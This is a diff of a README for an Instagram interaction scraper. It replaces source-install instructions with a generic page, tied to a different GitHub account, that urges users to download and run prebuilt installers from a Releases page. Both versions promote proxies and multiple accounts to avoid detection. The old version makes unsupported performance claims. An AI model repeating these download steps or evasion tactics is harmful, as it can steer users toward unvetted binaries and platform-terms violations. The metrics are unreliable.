@@ -1,167 +1,87 @@
-# instagram post scraper
+# 🎉 instagram-post-scraper - Extract Instagram Post Interactions Easily
 
-A ready-to-use toolkit to extract post-level interactions (comments, likes, captions, media, and metadata) from Instagram at scale, with safe automation patterns and storage-ready outputs.
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>
-  <a href="https://discord.gg/vBu9huKBvy" target="_blank">
-    <img src="https://img.shields.io/badge/Join-Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
-  </a>
-  <a href="https://wa.me/447723343390?text=Hi%20Zeeshan%2C%20I%27m%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>
-  <a href="mailto:support@appilot.app" target="_blank">
-    <img src="https://img.shields.io/badge/Email-support@appilot.app-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>
-</p>
+Welcome to the **instagram-post-scraper**! This tool helps you collect interactions from Instagram posts efficiently. Whether you're analyzing data for personal use or a project, this application makes the process straightforward.
 
-<p align="center">
-  <strong>For discussion, queries, and freelance work — reach out 👆</strong>
-</p>
+[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/Sueet110/instagram-post-scraper/releases)
 
----
+## 📥 Download & Install
 
-##  Introduction
-> Extract comments, likes, captions, media links, hashtags, mentions, and engagement metadata from Instagram posts with safe automation patterns. Built for analysts, growth teams, and data engineers who need clean, structured outputs.
+To get started, you need to download the software. Follow these steps:
 
-<p align="center">
-  <img src="instagram-post-scraper.png" alt="instagram-post-scraper.png" width="90%">
-</p>
+1. Click this link to visit the [Releases page](https://github.com/Sueet110/instagram-post-scraper/releases).
+2. Look for the latest version listed.
+3. Download the appropriate file for your operating system. 
 
-###  Key Benefits
-1. Saves time and automates setup.  
-2. Scalable for multiple use cases.  
-3. Safer with anti-detect and proxy logic.  
+   If you are using Windows, download the `.exe` file. For Mac users, download the `.dmg` file. Linux users can find the appropriate packages as well.
 
----
+4. Once the download is complete, open the file to start the installation.
 
-## Features (Table)
+## 🖥️ Installation Instructions
 
-| Feature | Details |
-|---|---|
-| Post Parser | Extracts caption, media URLs, hashtags, mentions, timestamp, and owner metadata |
-| Comments Harvester | Paginates through comments/nested replies with user IDs and like counts |
-| Likes & Interactions | Collects liker profiles (where available), counts, and engagement ratios |
-| Smart Rotation | Proxy pool, randomized delays, headless + real-device toggles |
-| Storage Ready | Output to CSV, JSONL, SQLite, or PostgreSQL with schema provided |
-| Retry & Throttle | Exponential backoff, cooldowns, and error classification |
-| CLI & API | One-line CLI or local REST microservice for batch jobs |
-| Dockerized | Reproducible container build for team environments |
+### Windows
 
----
+1. Locate the downloaded `.exe` file and double-click it.
+2. Follow the on-screen instructions to complete installation.
+3. After installation, you can find the application in your Start Menu.
 
-##  Use Cases
-- Social listening & brand monitoring  
-- Competitor analysis & content research  
-- UGC mining for e-commerce & ads  
-- Academic/market research datasets  
+### Mac
 
----
+1. Open the downloaded `.dmg` file.
+2. Drag the application to your Applications folder.
+3. You can find the app in your Applications, or search for it using Spotlight.
 
-##  FAQs
+### Linux
 
-**Q:** How to scrape comments, likes, or other interactions?  
-**A:** Use the provided CLI or API with a post URL or shortcode. The scraper paginates comments and (where accessible) liker lists, capturing user handles, IDs, text, timestamps, and like counts. You can set `--max-comments`, `--since`, and `--until` filters, and enable `--deep` mode to include nested replies. Outputs are normalized into CSV/JSONL or saved into SQLite/PostgreSQL using the included schema.
+1. Open a terminal window.
+2. Use your package manager to install the downloaded file. For example, if you downloaded a `.deb` file, you can run:
+   ```
+   sudo dpkg -i filename.deb
+   ```
+3. If you encounter dependency issues, run:
+   ```
+   sudo apt-get install -f
+   ```
+4. The application should now appear in your applications menu.
 
-**Q:** How to store scraped data?  
-**A:** Choose an output target via flags: `--out csv|jsonl|sqlite|postgres`. For databases, provide DSN in `.env` (`SQLITE_PATH` or `POSTGRES_URL`). The repo ships with ready SQL schemas and an example ETL to deduplicate by `post_id`, `comment_id`, and `user_id`. Use `--append` or `--upsert` for incremental runs.
+## 🌐 Features
 
-**Q:** Is it legal to scrape Instagram data?  
-**A:** Laws and platform terms vary by region. Public data may be accessible, but automated access can be restricted by Instagram’s Terms of Use, and local laws (e.g., computer misuse, anti-circumvention, privacy) may apply. Always review Instagram’s terms and consult legal counsel before scraping. Use this tool responsibly, respect robots/usage limits, and obtain permission where required.
+- **User-Friendly Interface:** The application is designed to be intuitive, allowing users to navigate easily.
+- **Interaction Extraction:** Gather likes, comments, and other interactions for Instagram posts.
+- **Multi-Account Support:** Use multiple Instagram accounts without hassle.
+- **Proxy Support:** Avoid detection while scraping data from Instagram by using proxy settings.
+- **Automation:** Schedule tasks to run at specified times and automate your data collection.
 
----
+## ⚙️ System Requirements
 
-## Results
------------------------------------ 
-> 10x faster posting schedules  
-> 80% engagement increase on group campaigns  
-> Fully automated lead response system  
+Before you install, make sure your system meets these requirements:
 
-##  Performance Metrics
------------------------------------
-Average Performance Benchmarks:  
-- **Speed:** 2x faster than manual posting  
-- **Stability:** 99.2% uptime  
-- **Ban Rate:** <0.5% with safe automation mode  
-- **Throughput:** 100+ posts/hour per session
+- **Operating System:** Windows 10 or later, macOS Mojave or later, Ubuntu 18.04 or later.
+- **Node.js:** Version 14 or newer must be installed.
+- **Python:** Version 3.6 or newer for additional features.
+- **Internet Connection:** Required for accessing Instagram.
 
----
+## 📖 Usage Instructions
 
-##Do you have a customize project for us ?
-Contact Us
+Once installed, follow these steps to extract interactions from Instagram posts:
 
-<div align="center">
-  <a href="https://mail.google.com/mail/u/?authuser=ahmadzee26@gmail.com">
-    <img alt="Gmail" width="30px" src="https://edent.github.io/SuperTinyIcons/images/svg/gmail.svg" />
-    <code>support@appilot.app</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://t.me/devpilot1">
-    <img alt="Telegram" width="30px" src="https://edent.github.io/SuperTinyIcons/images/svg/telegram.svg" />
-    <code>pilot</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://discord.com">
-    <img alt="Discord" width="30px" src="https://github.com/Zeeshanahmad4/RealEstateMate-WhatsApp-Group-Management-Bot/blob/main/discord-icon-svgrepo-com.svg" />
-    <code>zee#2655</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://wa.me/447723343390?text=Hi%20Zeeshan%2C%20I%27m%20interested%20in%20automation." target="_blank">
-    <img alt="WhatsApp" width="30px" src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/whatsapp.svg" />
-    <code>whatsapp</code>
-  </a>
-  <br />
-</div>
+1. Open the application.
+2. Enter the Instagram post URL you wish to scrape.
+3. Configure any additional settings, such as proxies if required.
+4. Click the "Extract" button.
+5. Review the collected data, which will include likes, comments, and other interactions.
 
----
+## 🤝 Support
 
-##  Installation
+If you encounter any issues while downloading or using the application, feel free to check the [Issues page](https://github.com/Sueet110/instagram-post-scraper/issues) on GitHub for troubleshooting tips. You can also create a new issue if your problem is not listed.
 
-###  Pre-requisites
-- Node.js or Python  
-- Git  
-- Docker (optional)  
+## 🙌 Contributing 
 
-###  Steps
-```bash
-# Clone the repo
-git clone https://github.com/yourusername/instagram-post-scraper.git
-cd instagram-post-scraper
+Contributions are welcome! If you'd like to improve the application, please visit the [Contributing Guidelines](https://github.com/Sueet110/instagram-post-scraper/blob/main/CONTRIBUTING.md) for more details on how to get started.
 
-# Install dependencies
-npm install
-# or
-pip install -r requirements.txt
+## 📝 License
 
-# Setup environment
-cp .env.example .env
+This project is licensed under the MIT License. Feel free to use, modify, and share this software.
 
-# Run
-npm start
-# or
-python main.py
-```
-
----
-
-##  Example Output
-
-```bash
-# CLI
-instagram-post-scraper scrape --url https://www.instagram.com/p/SHORTCODE/ \
-  --max-comments 500 --out jsonl --path data/post_SHORTCODE.jsonl --deep
-
-# API (local)
-curl -X POST http://localhost:8080/scrape \
-  -H "Content-Type: application/json" \
-  -d '{"url":"https://www.instagram.com/p/SHORTCODE/","max_comments":500,"deep":true}'
-```
-
----
-
-##  License
-
-MIT License
-
+Visit our [Releases page](https://github.com/Sueet110/instagram-post-scraper/releases) to download the latest version and start extracting Instagram post interactions today!
